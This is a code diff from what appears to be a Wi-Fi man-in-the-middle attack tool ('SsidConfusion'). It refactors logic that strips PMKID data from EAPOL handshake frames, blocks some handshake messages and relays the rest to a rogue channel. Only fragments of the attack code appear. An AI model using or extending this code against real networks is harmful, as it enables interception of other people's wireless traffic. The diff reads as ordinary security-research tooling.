@@ -13,7 +13,7 @@ using namespace std::chrono;
 // Strip PMKID KDE (DD 14 00 0F AC 04 + 16B) from EAPOL-Key msg1 key dat.
 // Msg1 has no MIC -> key data is unprotected plaintext
 static bool strip_pmkid_kde(frame_raw_t &raw) {
-    static constexpr uint8_t snap_eapol[] = {0x88, 0x8e};
+	static constexpr uint8_t snap_eapol[] = { eap::ETHERTYPE_EAPOL_HI, eap::ETHERTYPE_EAPOL_LO };
 	const auto snap = ranges::search(raw, snap_eapol).begin();
     if(snap == raw.end()) return false;
     const size_t eapol_off = (snap - raw.begin()) + 2;
@@ -59,9 +59,9 @@ FrameProcess SsidConfusion::handle_eapol_real(
 	if(addr2 == ap.get(SK::mac) && is_eapol(pdu)) {
 		if(client_state.get_state() < ClientState::Associated) return STOP;
 		//TODO check first M1as PMKSA cache hit -> force EAP restart
-		const int msg = get_eapol_msg_num(pdu);
-		if(msg == 2 || msg == 4) return STOP; //block cycles
-		if(msg == 1) {
+		const auto msg = get_eapol_msg_num(raw);
+		if(msg == EapolMsg::Msg2 || msg == EapolMsg::Msg4) return STOP; //block cycles
+		if(msg == EapolMsg::Msg1) {
 			frame_raw_t stripped = raw;
 			if(strip_pmkid_in_assoc) {
 				strip_pmkid_kde(stripped); //don't allow PMKSA - only in new connection
@@ -72,8 +72,8 @@ FrameProcess SsidConfusion::handle_eapol_real(
 			send_to_rogue(stripped);
 			return STOP;
 		}
-		// allow other processing for EAP frames (not valid EAPOL)
-		if(msg != -1) return CONTINUE;
+		// allow other processing for EAP frames (not EAPOL-Key)
+		if(msg == EapolMsg::Msg3) return CONTINUE;
 		display_traffic(pdu, "Real channel", " AP -> STA  -- MitM'ing ");
 		send_to_rogue(raw);
 		return STOP;
